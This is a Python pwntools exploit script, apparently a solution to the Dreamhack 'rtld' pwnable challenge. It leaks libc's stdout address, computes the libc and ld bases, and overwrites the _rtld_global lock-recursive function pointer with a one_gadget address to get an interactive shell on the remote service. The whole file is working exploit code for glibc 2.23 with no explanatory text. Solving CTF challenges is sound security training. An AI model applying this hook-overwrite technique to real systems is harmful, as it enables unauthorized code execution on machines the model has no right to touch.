from pwn import *

port = 8813
rem = remote("host3.dreamhack.games", port)

lib = ELF("./Pwnable/rtld/problem/libc-2.23.so")
ld = ELF("./Pwnable/rtld/problem/ld-2.23.so")

rem.recvuntil(b'stdout: ')
stdout_addr = int(rem.recvn(14)[2:].decode(), 16)
lib_base = stdout_addr - lib.symbols['_IO_2_1_stdout_']
ld_base = lib_base + 0x3ca000

rtld_addr = ld_base + ld.symbols['_rtld_global']
rtldRecur_addr = rtld_addr + 3848
gadget_offset = 0x4527a
gadget_addr = lib_base + gadget_offset

rem.sendlineafter(b"addr: ", str(rtldRecur_addr).encode())
rem.sendlineafter(b"value: ", str(gadget_addr).encode())

rem.interactive()